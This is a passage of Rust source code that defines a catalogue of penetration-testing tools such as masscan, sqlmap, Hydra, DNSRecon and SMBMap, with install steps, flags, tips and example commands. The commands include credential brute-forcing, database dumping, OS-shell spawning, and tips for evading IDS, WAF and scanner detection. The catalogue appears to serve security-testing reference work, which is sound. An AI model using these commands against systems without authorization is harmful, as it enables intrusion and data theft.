                    command: "sudo masscan 203.0.113.5 -p0-65535 --rate 10000".to_string(),
                },
                ToolExample {
                    description: "Slow scan to avoid detection".to_string(),
                    command: "sudo masscan 198.51.100.0/24 -p80,443 --rate 100".to_string(),
                },
                ToolExample {
                    description: "Scan known ports with banner grab".to_string(),
                    command: "sudo masscan 192.168.56.0/24 -p22,80,445 --banners".to_string(),
                },
                ToolExample {
                    description: "Exclude sensitive ranges".to_string(),
                    command: "sudo masscan 0.0.0.0/0 -p443 --excludefile exclude.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-p/-p0-65535".to_string(), description: "Port or port range".to_string() },
                ToolFlag { flag: "--top-ports <n>".to_string(), description: "Scan the most common ports".to_string() },
                ToolFlag { flag: "--rate".to_string(), description: "Packets per second".to_string() },
                ToolFlag { flag: "--adapter-ip/port".to_string(), description: "Bind to a specific source IP/port".to_string() },
                ToolFlag { flag: "--router-ip".to_string(), description: "Send packets via alternate gateway".to_string() },
                ToolFlag { flag: "--banners".to_string(), description: "Grab basic service banners".to_string() },
                ToolFlag { flag: "--exclude/--excludefile".to_string(), description: "Skip sensitive networks".to_string() },
                ToolFlag { flag: "-oX/-oJ/-oL".to_string(), description: "Output XML/JSON/list formats".to_string() },
            ],
            tips: vec![
                "Masscan requires root; consider --rate to respect network capacity.",
                "Use results as input to slower but deeper Nmap scans.",
                "Always exclude production ranges if not in scope.",
                "Plan scans during maintenance to avoid IDS alerts.",
            ],
        },
        "sqlmap" => ToolInstructions {
            name: "sqlmap".to_string(),
            description: "sqlmap automates the detection and exploitation of SQL injection flaws, supporting numerous DBMS engines and shell payloads.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install sqlmap",
                "",
                "# From source",
                "git clone https://github.com/sqlmapproject/sqlmap.git",
                "cd sqlmap",
                "python3 sqlmap.py --help",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic GET parameter test".to_string(),
                    command: "python3 sqlmap.py -u 'https://target/item.php?id=1' --batch".to_string(),
                },
                ToolExample {
                    description: "Use captured request file".to_string(),
                    command: "python3 sqlmap.py -r request.txt --level 3 --risk 2".to_string(),
                },
                ToolExample {
                    description: "Enumerate databases".to_string(),
                    command: "python3 sqlmap.py -u 'https://target/item.php?id=1' --dbs".to_string(),
                },
                ToolExample {
                    description: "Dump a table".to_string(),
                    command: "python3 sqlmap.py -u 'https://target/item.php?id=1' -D appdb -T users --dump".to_string(),
                },
                ToolExample {
                    description: "Obtain OS shell".to_string(),
                    command: "python3 sqlmap.py -u 'https://target/item.php?id=1' --os-shell".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u/-r".to_string(), description: "Direct URL (-u) or request file (-r)".to_string() },
                ToolFlag { flag: "--level/--risk".to_string(), description: "Depth of tests (1-5) and impact".to_string() },
                ToolFlag { flag: "--batch".to_string(), description: "Auto-confirm prompts".to_string() },
                ToolFlag { flag: "--dbs/-D/-T/-C".to_string(), description: "Enumerate DBs, tables, columns".to_string() },
                ToolFlag { flag: "--dump".to_string(), description: "Dump selected data".to_string() },
                ToolFlag { flag: "--os-shell/--sql-shell".to_string(), description: "Spawn command or SQL shells".to_string() },
                ToolFlag { flag: "--tamper".to_string(), description: "Apply tamper scripts (evasion)".to_string() },
                ToolFlag { flag: "--random-agent".to_string(), description: "Randomize User-Agent".to_string() },
            ],
            tips: vec![
                "Capture complex requests with Burp/ZAP and feed them via -r.",
                "Use lower --risk/--level on fragile production targets.",
                "Always document data extracted and clean up any uploaded shells.",
                "Tamper scripts can bypass WAF/IDS filters; try between attempts.",
            ],
        },
        "hydra" => ToolInstructions {
            name: "Hydra".to_string(),
            description: "Hydra is a fast network logon cracker that supports numerous protocols including SSH, RDP, FTP, SMB, HTTP, and databases.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install hydra",
                "",
                "# macOS (Homebrew)",
                "brew install hydra",
                "",
                "# Build from source",
                "git clone https://github.com/vanhauser-thc/thc-hydra.git",
                "cd thc-hydra && ./configure && make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "SSH brute force".to_string(),
                    command: "hydra -L users.txt -P passwords.txt ssh://192.168.1.50".to_string(),
                },
                ToolExample {
                    description: "HTTP POST form".to_string(),
                    command: "hydra -l admin -P passwords.txt 192.168.1.20 http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\"".to_string(),
                },
                ToolExample {
                    description: "FTP login".to_string(),
                    command: "hydra -l admin -P passwords.txt ftp://10.0.0.10".to_string(),
                },
                ToolExample {
                    description: "RDP brute force".to_string(),
                    command: "hydra -L users.txt -P passwords.txt rdp://corpdc.local".to_string(),
                },
                ToolExample {
                    description: "MySQL authentication".to_string(),
                    command: "hydra -L users.txt -P passwords.txt mysql://db.internal".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-l/-L".to_string(), description: "Single username (-l) or username list (-L)".to_string() },
                ToolFlag { flag: "-p/-P".to_string(), description: "Single password (-p) or list (-P)".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Custom port".to_string() },
                ToolFlag { flag: "-S/-4/-6".to_string(), description: "SSL (-S) or force IPv4/IPv6".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Parallel tasks (threads)".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Stop on first valid credential".to_string() },
                ToolFlag { flag: "-V/-d".to_string(), description: "Verbose or debug output".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Write results to file".to_string() },
                ToolFlag { flag: "http-post-form".to_string(), description: "Module syntax for form-based auth".to_string() },
            ],
            tips: vec![
                "Verify you are allowed to brute force the service and coordinate with blue teams.",
                "Tune threads (-t) to respect target stability and lockout policies.",
                "Use stop-on-success (-f) to reduce noise once credentials are found.",
                "Combine Hydra with compromised wordlists unique to the engagement.",
            ],
        },
        // Reconnaissance Tools
        "sublist3r" => ToolInstructions {
            name: "Sublist3r".to_string(),
            description: "Sublist3r is a fast Python subdomain enumeration tool designed to enumerate subdomains of websites using OSINT.",
            installation: vec![
                "# Install from pip",
                "pip3 install sublist3r",
                "",
                "# Install from source",
                "git clone https://github.com/aboul3la/Sublist3r.git",
                "cd Sublist3r",
                "pip3 install -r requirements.txt",
                "python3 sublist3r.py -h",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic subdomain enumeration".to_string(),
                    command: "python3 sublist3r.py -d example.com".to_string(),
                },
                ToolExample {
                    description: "Fast enumeration with verbose output".to_string(),
                    command: "python3 sublist3r.py -d example.com -v -t 20".to_string(),
                },
                ToolExample {
                    description: "Save results to file".to_string(),
                    command: "python3 sublist3r.py -d example.com -o subdomains.txt".to_string(),
                },
                ToolExample {
                    description: "Use specific search engines".to_string(),
                    command: "python3 sublist3r.py -d example.com -e google,bing,yahoo".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-d".to_string(), description: "Domain to enumerate".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose output".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Number of threads".to_string() },
                ToolFlag { flag: "-e".to_string(), description: "Search engines to use".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Include ports for subdomains".to_string() },
            ],
            tips: vec![
                "Use multiple search engines for better coverage.",
                "Combine with other tools like Amass for comprehensive enumeration.",
                "Save results for later analysis and correlation.",
                "Consider rate limiting to avoid being blocked by search engines.",
            ],
        },
        "theHarvester" => ToolInstructions {
            name: "theHarvester".to_string(),
            description: "theHarvester is an OSINT tool for gathering emails, subdomains, hosts, employee names, open ports, and banners from different public sources.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/laramies/theHarvester.git",
                "cd theHarvester",
                "pip3 install -r requirements.txt",
                "python3 theHarvester.py -h",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic email and subdomain gathering".to_string(),
                    command: "python3 theHarvester.py -d example.com -l 500 -b google".to_string(),
                },
                ToolExample {
                    description: "Comprehensive OSINT with multiple sources".to_string(),
                    command: "python3 theHarvester.py -d example.com -l 1000 -b all".to_string(),
                },
                ToolExample {
                    description: "Shodan integration for host discovery".to_string(),
                    command: "python3 theHarvester.py -d example.com -l 500 -b shodan".to_string(),
                },
                ToolExample {
                    description: "Save results to XML".to_string(),
                    command: "python3 theHarvester.py -d example.com -l 500 -b google -f myresults.xml".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-d".to_string(), description: "Domain to search".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Limit number of results".to_string() },
                ToolFlag { flag: "-b".to_string(), description: "Data source (google, bing, etc.)".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Save output to file".to_string() },
                ToolFlag { flag: "-n".to_string(), description: "Start DNS resolution of discovered hosts".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Perform DNS brute force".to_string() },
            ],
            tips: vec![
                "Use 'all' as data source for comprehensive gathering.",
                "Combine with Shodan API for additional host information.",
                "Be aware of API rate limits for various sources.",
                "Export results for correlation with other tools.",
            ],
        },
        "dnsrecon" => ToolInstructions {
            name: "DNSRecon".to_string(),
            description: "DNSRecon is a powerful DNS enumeration script that provides multiple techniques for gathering DNS information.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/darkoperator/dnsrecon.git",
                "cd dnsrecon",
                "pip3 install -r requirements.txt",
                "",
                "# Kali Linux (pre-installed)",
                "dnsrecon -h",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Standard enumeration".to_string(),
                    command: "dnsrecon -d example.com -t std".to_string(),
                },
                ToolExample {
                    description: "Zone transfer attempt".to_string(),
                    command: "dnsrecon -d example.com -t axfr".to_string(),
                },
                ToolExample {
                    description: "Reverse lookup of IP range".to_string(),
                    command: "dnsrecon -d example.com -t rvl -r 192.168.1.0/24".to_string(),
                },
                ToolExample {
                    description: "Brute force subdomains".to_string(),
                    command: "dnsrecon -d example.com -t brte -D wordlist.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-d".to_string(), description: "Target domain".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Type of enumeration".to_string() },
                ToolFlag { flag: "-n".to_string(), description: "Name server to use".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "IP range for reverse lookup".to_string() },
                ToolFlag { flag: "-D".to_string(), description: "Dictionary file for brute force".to_string() },
                ToolFlag { flag: "-a".to_string(), description: "Perform all enumeration types".to_string() },
            ],
            tips: vec![
                "Always try zone transfer first - high impact if successful.",
                "Use custom wordlists for better brute force results.",
                "Combine with other DNS tools for comprehensive coverage.",
                "Document all DNS findings for attack surface mapping.",
            ],
        },
        "dnsenum" => ToolInstructions {
            name: "DNSenum".to_string(),
            description: "DNSenum is a multithreaded perl script to enumerate DNS information of a domain and discover non-contiguous IP blocks.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install dnsenum",
                "",
                "# Install from source",
                "git clone https://github.com/fwaeytens/dnsenum.git",
                "cd dnsenum",
                "chmod +x dnsenum.pl",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic DNS enumeration".to_string(),
                    command: "dnsenum example.com".to_string(),
                },
                ToolExample {
                    description: "Verbose with subdomain brute force".to_string(),
                    command: "dnsenum --subfile subdomains.txt -f /usr/share/wordlists/dns.txt example.com".to_string(),
                },
                ToolExample {
                    description: "With thread control and WHOIS".to_string(),
                    command: "dnsenum -t 16 -w example.com".to_string(),
                },
                ToolExample {
                    description: "Reverse lookup of IP range".to_string(),
                    command: "dnsenum -r 192.168.1.0/24 example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "--subfile".to_string(), description: "Save subdomains to file".to_string() },
                ToolFlag { flag: "-f".to_string(), description: "Dictionary file for brute force".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Number of threads".to_string() },
                ToolFlag { flag: "-w".to_string(), description: "Perform WHOIS queries".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "Reverse lookup of IP range".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Perform reverse lookups on subnets".to_string() },
            ],
            tips: vec![
                "Use good wordlists for subdomain brute forcing.",
                "Monitor thread count to avoid overwhelming target servers.",
                "Combine results with other DNS tools for completeness.",
                "Save subdomain lists for later testing phases.",
            ],
        },
        "maltego" => ToolInstructions {
            name: "Maltego".to_string(),
            description: "Maltego is an interactive data mining tool that renders directed graphs for link analysis. It's excellent for visualizing relationships between entities.",
            installation: vec![
                "# Download from official site",
                "# https://www.maltego.com/downloads/",
                "",
                "# Community Edition (CE)",
                "# Register and download from Maltego website",
                "",
                "# Kali Linux (Community Edition)",
                "maltego",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Launch Maltego GUI".to_string(),
                    command: "maltego".to_string(),
                },
                ToolExample {
                    description: "Run Maltego with specific transform".to_string(),
                    command: "maltego -transform 'maltego.DNS_To_IPAddress'".to_string(),
                },
                ToolExample {
                    description: "Import data for analysis".to_string(),
                    command: "# Use GUI to import CSV, JSON, or other formats".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-transform".to_string(), description: "Run specific transform".to_string() },
                ToolFlag { flag: "-import".to_string(), description: "Import data file".to_string() },
                ToolFlag { flag: "-export".to_string(), description: "Export graph results".to_string() },
                ToolFlag { flag: "-machine".to_string(), description: "Run in machine mode".to_string() },
            ],
            tips: vec![
                "Use transforms to automatically discover related information.",
                "Save graphs for later analysis and reporting.",
                "Combine with OSINT data for comprehensive intelligence.",
                "Consider API keys for premium transforms and data sources.",
            ],
        },
        "recon-ng" => ToolInstructions {
            name: "Recon-ng".to_string(),
            description: "Recon-ng is a powerful Web Reconnaissance framework with a modular interface similar to Metasploit.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/lanmaster53/recon-ng.git",
                "cd recon-ng",
                "pip3 install -r requirements.txt",
                "./recon-ng",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Launch Recon-ng".to_string(),
                    command: "./recon-ng".to_string(),
                },
                ToolExample {
                    description: "Create workspace".to_string(),
                    command: "recon-ng> workspace create example".to_string(),
                },
                ToolExample {
                    description: "Add domain and run modules".to_string(),
                    command: "recon-ng> add domains example.com".to_string(),
                },
                ToolExample {
                    description: "Run Google dorking module".to_string(),
                    command: "recon-ng> modules search google_site_web".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "workspace".to_string(), description: "Manage workspaces".to_string() },
                ToolFlag { flag: "add".to_string(), description: "Add target data".to_string() },
                ToolFlag { flag: "modules".to_string(), description: "Manage reconnaissance modules".to_string() },
                ToolFlag { flag: "keys".to_string(), description: "Manage API keys".to_string() },
                ToolFlag { flag: "show".to_string(), description: "Show various information".to_string() },
            ],
            tips: vec![
                "Configure API keys for maximum module functionality.",
                "Use workspaces to organize different engagements.",
                "Chain modules for comprehensive reconnaissance.",
                "Export data for analysis in other tools.",
            ],
        },
        "photon" => ToolInstructions {
            name: "Photon".to_string(),
            description: "Photon is an incredibly fast crawler designed for OSINT that extracts URLs, emails, files, website accounts, and more.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/s0md3v/Photon.git",
                "cd Photon",
                "pip3 install -r requirements.txt",
                "python3 photon.py -h",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic web crawling".to_string(),
                    command: "python3 photon.py -u https://example.com".to_string(),
                },
                ToolExample {
                    description: "Deep crawl with more threads".to_string(),
                    command: "python3 photon.py -u https://example.com -l 3 -t 20".to_string(),
                },
                ToolExample {
                    description: "Save all data".to_string(),
                    command: "python3 photon.py -u https://example.com -d example --output".to_string(),
                },
                ToolExample {
                    description: "Crawl with cookies and headers".to_string(),
                    command: "python3 photon.py -u https://example.com -c 'session=abc123' -h 'Authorization: Bearer token'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-u".to_string(), description: "Target URL".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Level of crawling depth".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Number of threads".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "Output directory name".to_string() },
                ToolFlag { flag: "--output".to_string(), description: "Save output to files".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Cookie string".to_string() },
                ToolFlag { flag: "-h".to_string(), description: "Custom headers".to_string() },
            ],
            tips: vec![
                "Increase threads for faster crawling but monitor target response.",
                "Use appropriate depth levels to avoid infinite crawling.",
                "Save all output for later analysis and correlation.",
                "Combine with other tools for comprehensive reconnaissance.",
            ],
        },
        "spiderfoot" => ToolInstructions {
            name: "SpiderFoot".to_string(),
            description: "SpiderFoot is an OSINT automation tool that integrates with numerous data sources to gather intelligence on IP addresses, domain names, email addresses, etc.",
            installation: vec![
                "# Install from git",
                "git clone https://github.com/smicallef/spiderfoot.git",
                "cd spiderfoot",
                "pip3 install -r requirements.txt",
                "python3 sf.py -h",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Launch SpiderFoot web interface".to_string(),
                    command: "python3 sf.py -l 127.0.0.1:5001".to_string(),
                },
                ToolExample {
                    description: "CLI scan of domain".to_string(),
                    command: "python3 sf.py -d example.com -s all -o json".to_string(),
                },
                ToolExample {
                    description: "Scan with specific modules".to_string(),
                    command: "python3 sf.py -d example.com -m sfp_dns,sfp_shodan".to_string(),
                },
                ToolExample {
                    description: "Scan with strict correlation".to_string(),
                    command: "python3 sf.py -d example.com -S -t 2".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-d".to_string(), description: "Target domain/IP/email".to_string() },
                ToolFlag { flag: "-s".to_string(), description: "Scan modules to use".to_string() },
                ToolFlag { flag: "-m".to_string(), description: "Specific modules to run".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output format".to_string() },
                ToolFlag { flag: "-l".to_string(), description: "Listen address for web UI".to_string() },
                ToolFlag { flag: "-S".to_string(), description: "Strict correlation mode".to_string() },
                ToolFlag { flag: "-t".to_string(), description: "Maximum thread count".to_string() },
            ],
            tips: vec![
                "Use web interface for better visualization and control.",
                "Configure API keys for maximum data source coverage.",
                "Use strict correlation to reduce false positives.",
                "Export results for integration with other tools.",
            ],
        },
        // Scanning & Enumeration Tools (additional)
        "naabu" => ToolInstructions {
            name: "Naabu".to_string(),
            description: "Naabu is a fast port scanner written in Go that allows you to enumerate valid ports for hosts in a fast and reliable manner.",
            installation: vec![
                "# Install from source",
                "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
                "",
                "# Download pre-compiled binary",
                "# https://github.com/projectdiscovery/naabu/releases",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic port scan".to_string(),
                    command: "naabu -host example.com".to_string(),
                },
                ToolExample {
                    description: "Scan with top 1000 ports".to_string(),
                    command: "naabu -host 192.168.1.1 -top-ports 1000".to_string(),
                },
                ToolExample {
                    description: "Fast scan with JSON output".to_string(),
                    command: "naabu -host example.com -json -o results.json".to_string(),
                },
                ToolExample {
                    description: "Scan multiple hosts".to_string(),
                    command: "naabu -list hosts.txt -p 80,443,8080".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-host".to_string(), description: "Target host to scan".to_string() },
                ToolFlag { flag: "-list".to_string(), description: "File with target hosts".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Ports to scan".to_string() },
                ToolFlag { flag: "-top-ports".to_string(), description: "Scan top N ports".to_string() },
                ToolFlag { flag: "-json".to_string(), description: "JSON output format".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-rate".to_string(), description: "Packets per second".to_string() },
            ],
            tips: vec![
                "Use JSON output for easy integration with other tools.",
                "Adjust rate to balance speed and stealth.",
                "Combine with Nmap for detailed service detection.",
                "Use CIDR notation for network scanning.",
            ],
        },
        "nikto" => ToolInstructions {
            name: "Nikto".to_string(),
            description: "Nikto is a web server scanner that performs comprehensive tests against web servers to find dangerous files/programs and outdated versions.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install nikto",
                "",
                "# Kali Linux (pre-installed)",
                "nikto -h",
                "",
                "# Install from source",
                "git clone https://github.com/sullo/nikto.git",
                "cd nikto/program",
                "perl nikto.pl -h",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic web server scan".to_string(),
                    command: "nikto -h https://example.com".to_string(),
                },
                ToolExample {
                    description: "Scan with custom user agent".to_string(),
                    command: "nikto -h https://example.com -useragent 'Custom Scanner 1.0'".to_string(),
                },
                ToolExample {
                    description: "Scan specific port".to_string(),
                    command: "nikto -h 192.168.1.1 -p 8080".to_string(),
                },
                ToolExample {
                    description: "Save output to file".to_string(),
                    command: "nikto -h https://example.com -o nikto_results.html -Format htm".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-h".to_string(), description: "Target host/IP".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Port to scan".to_string() },
                ToolFlag { flag: "-useragent".to_string(), description: "Custom user agent".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-Format".to_string(), description: "Output format (csv, htm, txt, xml)".to_string() },
                ToolFlag { flag: "-Tuning".to_string(), description: "Scan tuning options".to_string() },
                ToolFlag { flag: "-Plugins".to_string(), description: "Plugins to use/skip".to_string() },
            ],
            tips: vec![
                "Use custom user agents to avoid scanner detection.",
                "Save results in HTML format for easy reporting.",
                "Tune scanning options to reduce noise on sensitive targets.",
                "Combine with other web scanners for comprehensive coverage.",
            ],
        },
        "dirb" => ToolInstructions {
            name: "Dirb".to_string(),
            description: "Dirb is a Web Content Scanner that looks for existing (and/or hidden) Web Objects by brute force crawling the web server.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install dirb",
                "",
                "# Kali Linux (pre-installed)",
                "dirb",
                "",
                "# Install from source",
                "git clone https://github.com/v0re/dirb.git",
                "cd dirb",
                "make && sudo make install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic directory scan".to_string(),
                    command: "dirb https://example.com".to_string(),
                },
                ToolExample {
                    description: "Scan with custom wordlist".to_string(),
                    command: "dirb https://example.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt".to_string(),
                },
                ToolExample {
                    description: "Scan with file extensions".to_string(),
                    command: "dirb https://example.com -X .php,.html,.txt".to_string(),
                },
                ToolExample {
                    description: "Save output to file".to_string(),
                    command: "dirb https://example.com -o dirb_results.txt".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-a".to_string(), description: "User agent".to_string() },
                ToolFlag { flag: "-c".to_string(), description: "Cookie string".to_string() },
                ToolFlag { flag: "-X".to_string(), description: "File extensions to scan".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "Output file".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "Don't stop on warnings".to_string() },
                ToolFlag { flag: "-S".to_string(), description: "Silent mode".to_string() },
                ToolFlag { flag: "-v".to_string(), description: "Verbose mode".to_string() },
            ],
            tips: vec![
                "Use comprehensive wordlists for better results.",
                "Combine with multiple file extensions for thorough coverage.",
                "Save results for analysis and later testing.",
                "Consider rate limiting to avoid detection.",
            ],
        },
        "wfuzz" => ToolInstructions {
            name: "Wfuzz".to_string(),
            description: "Wfuzz is a web application fuzzer used to brute force GET/POST parameters, analyze responses, and find hidden resources.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install wfuzz",
                "",
                "# Install from pip",
                "pip3 install wfuzz",
                "",
                "# Install from source",
                "git clone https://github.com/xmendez/wfuzz.git",
                "cd wfuzz",
                "python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic directory fuzzing".to_string(),
                    command: "wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://example.com/FUZZ".to_string(),
                },
                ToolExample {
                    description: "Parameter fuzzing".to_string(),
                    command: "wfuzz -w wordlist.txt -z range,1-100 --hc 404 https://example.com/search.php?id=FUZZ".to_string(),
                },
                ToolExample {
                    description: "POST form fuzzing".to_string(),
                    command: "wfuzz -w users.txt -w passwords.txt -d 'user=FUZZ&pass=FUZ2Z' https://example.com/login.php".to_string(),
                },
                ToolExample {
                    description: "Virtual host enumeration".to_string(),
                    command: "wfuzz -w subdomains.txt -H 'Host: FUZZ.example.com' https://example.com".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-w".to_string(), description: "Wordlist file".to_string() },
                ToolFlag { flag: "-z".to_string(), description: "Payload generator".to_string() },
                ToolFlag { flag: "-d".to_string(), description: "POST data".to_string() },
                ToolFlag { flag: "-H".to_string(), description: "Custom headers".to_string() },
                ToolFlag { flag: "--hc".to_string(), description: "Hide response codes".to_string() },
                ToolFlag { flag: "--hl".to_string(), description: "Hide response lines".to_string() },
                ToolFlag { flag: "--hw".to_string(), description: "Hide response words".to_string() },
            ],
            tips: vec![
                "Use filters (--hc, --hl, --hw) to reduce noise.",
                "Combine multiple wordlists for complex attacks.",
                "Save interesting results for manual testing.",
                "Use POST data for form and API testing.",
            ],
        },
        "enum4linux" => ToolInstructions {
            name: "Enum4linux".to_string(),
            description: "Enum4linux is a tool for enumerating information from Windows and Samba systems, similar to enum.exe but for Linux.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install enum4linux",
                "",
                "# Kali Linux (pre-installed)",
                "enum4linux",
                "",
                "# Install from source",
                "git clone https://github.com/CiscoCXSecurity/enum4linux.git",
                "cd enum4linux",
                "chmod +x enum4linux.pl",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Full enumeration".to_string(),
                    command: "enum4linux -a 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "Share enumeration".to_string(),
                    command: "enum4linux -S 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "User enumeration".to_string(),
                    command: "enum4linux -U 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "OS and workgroup information".to_string(),
                    command: "enum4linux -o 192.168.1.100".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-a".to_string(), description: "All enumeration options".to_string() },
                ToolFlag { flag: "-U".to_string(), description: "Get userlist".to_string() },
                ToolFlag { flag: "-S".to_string(), description: "Share enumeration".to_string() },
                ToolFlag { flag: "-P".to_string(), description: "Password policy".to_string() },
                ToolFlag { flag: "-o".to_string(), description: "OS information".to_string() },
                ToolFlag { flag: "-g".to_string(), description: "Group and member list".to_string() },
                ToolFlag { flag: "-r".to_string(), description: "RID cycling".to_string() },
            ],
            tips: vec![
                "Always try full enumeration first for maximum information.",
                "Use results to identify weak configurations and users.",
                "Document share information for potential access paths.",
                "Combine with SMB exploitation tools for follow-up testing.",
            ],
        },
        "smbmap" => ToolInstructions {
            name: "SMBMap".to_string(),
            description: "SMBMap allows users to enumerate samba share drives across an entire domain. Useful for identifying sensitive shares.",
            installation: vec![
                "# Install from pip",
                "pip3 install smbmap",
                "",
                "# Install from source",
                "git clone https://github.com/ShawnDEvans/smbmap.git",
                "cd smbmap",
                "python3 setup.py install",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic share enumeration".to_string(),
                    command: "smbmap -H 192.168.1.100".to_string(),
                },
                ToolExample {
                    description: "List shares with permissions".to_string(),
                    command: "smbmap -H 192.168.1.100 -R".to_string(),
                },
                ToolExample {
                    description: "Download files from share".to_string(),
                    command: "smbmap -H 192.168.1.100 -u guest -p '' -R 'share_name' --download 'path/to/file'".to_string(),
                },
                ToolExample {
                    description: "Upload file to share".to_string(),
                    command: "smbmap -H 192.168.1.100 -u user -p pass -R 'share_name' --upload '/local/file.txt' 'remote/path'".to_string(),
                },
            ],
            common_flags: vec![
                ToolFlag { flag: "-H".to_string(), description: "Target host".to_string() },
                ToolFlag { flag: "-u".to_string(), description: "Username".to_string() },
                ToolFlag { flag: "-p".to_string(), description: "Password".to_string() },
                ToolFlag { flag: "-R".to_string(), description: "Recursively list directories".to_string() },
                ToolFlag { flag: "--download".to_string(), description: "Download file".to_string() },
                ToolFlag { flag: "--upload".to_string(), description: "Upload file".to_string() },
                ToolFlag { flag: "-x".to_string(), description: "Execute command".to_string() },
            ],
            tips: vec![
                "Try null session authentication for anonymous access.",
                "Look for sensitive files in readable shares.",
                "Document permissions for potential privilege escalation.",
                "Be careful with file operations to avoid detection.",
            ],
        },
        "snmpwalk" => ToolInstructions {
            name: "SNMPwalk".to_string(),
            description: "SNMPwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.",
            installation: vec![
                "# Debian/Ubuntu",
                "sudo apt install snmp",
                "",
                "# RHEL/CentOS",
                "sudo yum install net-snmp-utils",
                "",
                "# Install from source",
                "wget https://sourceforge.net/projects/net-snmp/files/net-snmp/",
            ]
            .into_iter()
            .map(|s| s.to_string())
            .collect(),
            examples: vec![
                ToolExample {
                    description: "Basic SNMP walk".to_string(),
                    command: "snmpwalk -v2c -c public 192.168.1.1".to_string(),
                },
                ToolExample {
                    description: "Walk specific OID tree".to_string(),
